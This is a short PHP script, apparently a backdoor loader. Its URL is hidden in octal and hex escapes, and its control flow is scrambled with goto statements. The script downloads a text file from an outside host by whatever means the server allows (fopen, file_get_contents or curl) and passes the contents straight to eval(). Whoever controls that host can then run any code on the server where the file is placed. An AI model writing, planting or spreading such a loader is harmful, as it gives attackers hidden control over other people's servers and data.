<?php
/* 

Author: Iddant ID
Provider: Three

*/
eval(G7VVX("\150\x74\x74\x70\x73\x3a\57\57\141\160\x69\56\151\160\x6b\x7a\x6f\156\x65\56\x6d\171\56\151\144\x2f\x65\156\x63\x6f\144\145\x2f\142\x65\164\x61\56\164\x78\164"));
function g7vvx($fWmPk)
{
    goto q619j;
    fcgWT:
    x0SId:
    goto HhuZ4;
    Xx4Y8:
    nmwxn:
    goto fpB17;
    q619j:
    $gHV7T = fopen($fWmPk, "\x72\x62");
    goto SL2vD;
    Yv2tU:
    aVFmh:
    goto aWd4Y;
    m16m6:
    curl_close($wdyLg);
    goto uIqjg;
    uIqjg:
    goto x0SId;
    goto fWsYq;
    fpB17:
    $qe5OL .= $tLucF;
    goto fcgWT;
    DWfku:
    if (function_exists("\x66\x69\154\145\x5f\x67\x65\x74\137\143\157\156\x74\x65\x6e\x74\x73") && ($tLucF = file_get_contents($fWmPk))) {
        goto nmwxn;
    }
    goto uzib6;
    gsMCe:
    $qe5OL .= curl_exec($wdyLg);
    goto m16m6;
    HhuZ4:
    return "\77\x3e" . $qe5OL;
    goto NqJ48;
    SL2vD:
    $qe5OL = '';
    goto pbXtL;
    uh56k:
    goto GQMRE;
    goto Yv2tU;
    pbXtL:
    if (function_exists("\146\157\160\145\x6e") && function_exists("\x66\145\x6f\x66") && function_exists("\146\162\145\141\144") && $gHV7T) {
        goto weCJY;
    }
    goto DWfku;
    nOP9q:
    curl_setopt($wdyLg, CURLOPT_FOLLOWLOCATION, 1);
    goto gsMCe;
    dcfNu:
    goto x0SId;
    goto Xx4Y8;
    LEMrp:
    GQMRE:
    goto ZACih;
    FmHel:
    curl_setopt($wdyLg, CURLOPT_URL, $fWmPk);
    goto Sn_mv;
    Sn_mv:
    curl_setopt($wdyLg, CURLOPT_RETURNTRANSFER, 1);
    goto nOP9q;
    uzib6:
    $wdyLg = curl_init();
    goto FmHel;
    aWd4Y:
    fclose($gHV7T);
    goto dcfNu;
    wDP37:
    $qe5OL .= fread($gHV7T, 1024 * 8);
    goto uh56k;
    fWsYq:
    weCJY:
    goto LEMrp;
    ZACih:
    if (feof($gHV7T)) {
        goto aVFmh;
    }
    goto wDP37;
    NqJ48:
}
